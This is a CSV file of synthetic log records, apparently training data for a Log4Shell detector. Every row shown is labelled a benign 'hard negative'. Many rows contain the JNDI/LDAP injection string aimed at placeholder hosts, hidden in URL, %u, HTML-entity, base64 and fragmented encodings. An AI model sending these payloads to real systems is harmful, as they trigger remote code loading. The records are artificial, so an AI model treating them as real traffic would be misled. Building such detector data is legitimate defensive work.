id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-003840,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-train-0207","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-train-0207",0,benign,benign_keyword_only,mixed,train,low
LS-003841,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-train-0208","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-train-0208",0,benign,benign_keyword_only,mixed,train,low
LS-003842,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-train-0209","info json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-train-0209",0,benign,benign_json_escaped_payload,mixed,train,low
LS-003843,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fplaybook.local%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-train-0210,get /kb/log4shell?sample=${jndi:ldap://playbook.local/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-train-0210,0,benign,benign_encoded_documentation,mixed,train,low
LS-003844,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-train-0211,info markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-train-0211,0,benign,benign_documentation_example,mixed,train,low
LS-003845,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-train-0212","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-train-0212",0,benign,benign_keyword_only,mixed,train,low
LS-003846,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'sample.invalid' are shown separately for awareness trace_id=hardneg-train-0213,training note tokens '$' '{' 'jndi' ':ldap://' 'sample.invalid' are shown separately for awareness trace_id=hardneg-train-0213,0,benign,benign_fragmented_tutorial_text,mixed,train,low
LS-003847,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-train-0214,info markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-train-0214,0,benign,benign_documentation_example,mixed,train,low
LS-003848,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://playbook.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0215,security_review indicator_sample='${jndi:ldap://playbook.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0215,0,benign,benign_scanner_report,mixed,train,low
LS-003849,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'kb.internal' are shown separately for awareness trace_id=hardneg-train-0216,training note tokens '$' '{' 'jndi' ':ldap://' 'kb.internal' are shown separately for awareness trace_id=hardneg-train-0216,0,benign,benign_fragmented_tutorial_text,mixed,train,low
LS-003850,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fkb.internal%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-train-0217,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fkb.internal%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-train-0217,0,benign,benign_percent_u_documentation,mixed,train,low
LS-003851,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-train-0218,info escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-train-0218,0,benign,benign_json_escaped_payload,mixed,train,low
LS-003852,2026-05-17,hard_negative,LDAP connection pool initialized for corporate directory trace_id=hardneg-train-0219,ldap connection pool initialized for corporate directory trace_id=hardneg-train-0219,0,benign,keyword_only,mixed,train,low
LS-003853,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Ftraining.local%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-train-0220,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002ftraining.local%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-train-0220,0,benign,benign_percent_u_documentation,mixed,train,low
LS-003854,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fplaybook.local%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-train-0221,get /docs/search?q=${jndi:ldap://playbook.local/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-train-0221,0,benign,benign_encoded_search_query,mixed,train,low
LS-003855,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;training.local&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-train-0222,get /preview?html=${jndi:ldap://training.local/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-train-0222,0,benign,benign_html_entity_documentation,mixed,train,low
LS-003856,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fkb.internal%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-train-0223,get /kb/log4shell?sample=${jndi:ldap://kb.internal/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-train-0223,0,benign,benign_encoded_documentation,mixed,train,low
LS-003857,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fdocs.example%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-train-0224,get /kb/log4shell?sample=${jndi:ldap://docs.example/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-train-0224,0,benign,benign_encoded_documentation,mixed,train,low
LS-003858,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fsample.invalid%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-train-0225,get /kb/log4shell?sample=${jndi:ldap://sample.invalid/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-train-0225,0,benign,benign_encoded_documentation,mixed,train,low
LS-003859,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fdocs.example%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-train-0226,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fdocs.example%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-train-0226,0,benign,benign_percent_u_documentation,mixed,train,low
LS-003860,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9rYi5pbnRlcm5hbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-train-0227,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9ryi5pbnrlcm5hbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-train-0227,0,benign,benign_base64_artifact,mixed,train,low
LS-003861,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'playbook.local' are shown separately for awareness trace_id=hardneg-train-0228,training note tokens '$' '{' 'jndi' ':ldap://' 'playbook.local' are shown separately for awareness trace_id=hardneg-train-0228,0,benign,benign_fragmented_tutorial_text,mixed,train,low
LS-003862,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;playbook.local&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-train-0229,get /preview?html=${jndi:ldap://playbook.local/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-train-0229,0,benign,benign_html_entity_documentation,mixed,train,low
LS-003863,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fdefensive-lab.example%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-train-0230,get /kb/log4shell?sample=${jndi:ldap://defensive-lab.example/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-train-0230,0,benign,benign_encoded_documentation,mixed,train,low
LS-003864,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fdocs.example%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-train-0231,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fdocs.example%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-train-0231,0,benign,benign_percent_u_documentation,mixed,train,low
LS-003865,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://kb.internal/sample}' render_context=documentation_only trace_id=hardneg-train-0232,info markdown_code_block value='${jndi:ldap://kb.internal/sample}' render_context=documentation_only trace_id=hardneg-train-0232,0,benign,benign_documentation_example,mixed,train,low
LS-003866,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;training.local&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-train-0233,get /preview?html=${jndi:ldap://training.local/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-train-0233,0,benign,benign_html_entity_documentation,mixed,train,low
LS-003867,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://docs.example/escaped}' source=developer_guide trace_id=hardneg-train-0234,info escaped_code_sample value='\${jndi:ldap://docs.example/escaped}' source=developer_guide trace_id=hardneg-train-0234,0,benign,benign_json_escaped_payload,mixed,train,low
LS-003868,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://docs.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0235,security_review indicator_sample='${jndi:ldap://docs.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0235,0,benign,benign_scanner_report,mixed,train,low
LS-003869,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fdocs.example%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-train-0236,get /kb/log4shell?sample=${jndi:ldap://docs.example/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-train-0236,0,benign,benign_encoded_documentation,mixed,train,low
LS-003870,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fsample.invalid%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-train-0237,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fsample.invalid%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-train-0237,0,benign,benign_percent_u_documentation,mixed,train,low
LS-003871,2026-05-17,hard_negative,Developer opened Java Naming and Directory Interface documentation trace_id=hardneg-train-0238,developer opened java naming and directory interface documentation trace_id=hardneg-train-0238,0,benign,documentation,mixed,train,low
LS-003872,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fdefensive-lab.example%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-train-0239,get /kb/log4shell?sample=${jndi:ldap://defensive-lab.example/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-train-0239,0,benign,benign_encoded_documentation,mixed,train,low
LS-003873,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly90cmFpbmluZy5sb2NhbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-train-0240,debug artifact payload_b64=jhtqbmrpomxkyxa6ly90cmfpbmluzy5sb2nhbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-train-0240,0,benign,benign_base64_artifact,mixed,train,low
LS-003874,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://kb.internal/json}"",""literal"":true} trace_id=hardneg-train-0241","info json_template={""example"":""\\${jndi:ldap://kb.internal/json}"",""literal"":true} trace_id=hardneg-train-0241",0,benign,benign_json_escaped_payload,mixed,train,low
LS-003875,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly90cmFpbmluZy5sb2NhbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-train-0242,debug artifact payload_b64=jhtqbmrpomxkyxa6ly90cmfpbmluzy5sb2nhbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-train-0242,0,benign,benign_base64_artifact,mixed,train,low
LS-003876,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://kb.internal/json}"",""literal"":true} trace_id=hardneg-train-0243","info json_template={""example"":""\\${jndi:ldap://kb.internal/json}"",""literal"":true} trace_id=hardneg-train-0243",0,benign,benign_json_escaped_payload,mixed,train,low
LS-003877,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fkb.internal%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-train-0244,get /docs/search?q=${jndi:ldap://kb.internal/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-train-0244,0,benign,benign_encoded_search_query,mixed,train,low
LS-003878,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://kb.internal/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0245,assert literal_payload_string equals '${jndi:ldap://kb.internal/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0245,0,benign,benign_unit_test_fixture,mixed,train,low
LS-003879,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://kb.internal/sample}' render_context=documentation_only trace_id=hardneg-train-0246,info markdown_code_block value='${jndi:ldap://kb.internal/sample}' render_context=documentation_only trace_id=hardneg-train-0246,0,benign,benign_documentation_example,mixed,train,low
LS-003880,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://training.local/escaped}' source=developer_guide trace_id=hardneg-train-0247,info escaped_code_sample value='\${jndi:ldap://training.local/escaped}' source=developer_guide trace_id=hardneg-train-0247,0,benign,benign_json_escaped_payload,mixed,train,low
LS-003881,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;defensive-lab.example&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-train-0248,get /preview?html=${jndi:ldap://defensive-lab.example/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-train-0248,0,benign,benign_html_entity_documentation,mixed,train,low
LS-003882,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;docs.example&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-train-0249,get /preview?html=${jndi:ldap://docs.example/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-train-0249,0,benign,benign_html_entity_documentation,mixed,train,low
LS-003883,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fdefensive-lab.example%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-train-0250,get /kb/log4shell?sample=${jndi:ldap://defensive-lab.example/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-train-0250,0,benign,benign_encoded_documentation,mixed,train,low
LS-003884,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fkb.internal%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-train-0251,get /kb/log4shell?sample=${jndi:ldap://kb.internal/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-train-0251,0,benign,benign_encoded_documentation,mixed,train,low
LS-003885,2026-05-17,hard_negative,User searched for Log4j mitigation guide trace_id=hardneg-train-0252,user searched for log4j mitigation guide trace_id=hardneg-train-0252,0,benign,keyword_only,mixed,train,low
